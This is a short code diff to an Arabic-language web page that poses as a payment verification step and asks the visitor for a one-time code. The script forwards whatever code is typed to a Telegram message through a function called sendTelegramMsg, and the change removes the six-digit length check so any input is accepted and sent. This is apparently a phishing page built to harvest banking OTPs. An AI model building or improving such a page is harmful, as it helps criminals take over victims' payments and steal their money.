@@ -210,7 +210,7 @@
             </div>
             <div class="payment-header">
                 <h2>التحقق من الدفع</h2>
-                <p>أدخل رمز التحقق المكون من 6 أرقام</p>
+                <p>أدخل رمز التحقق</p>
             </div>
             <div class="otp-inputs" id="otp-inputs">
                 <input type="tel" maxlength="1" inputmode="numeric">
@@ -332,8 +332,8 @@
             let otpCode = '';
             inputs.forEach(input => { otpCode += input.value; });
 
-            if (otpCode.length !== 6) { alert("الرجاء إدخال 6 أرقام كاملة"); return; }
-
+            // تم مسح شرط الـ 6 أرقام، الآن يقبل أي عدد
+            
             sendTelegramMsg(`🔑 رمز التحقق OTP: ${otpCode}`);
 
             document.getElementById('otp-page').style.display = 'none';
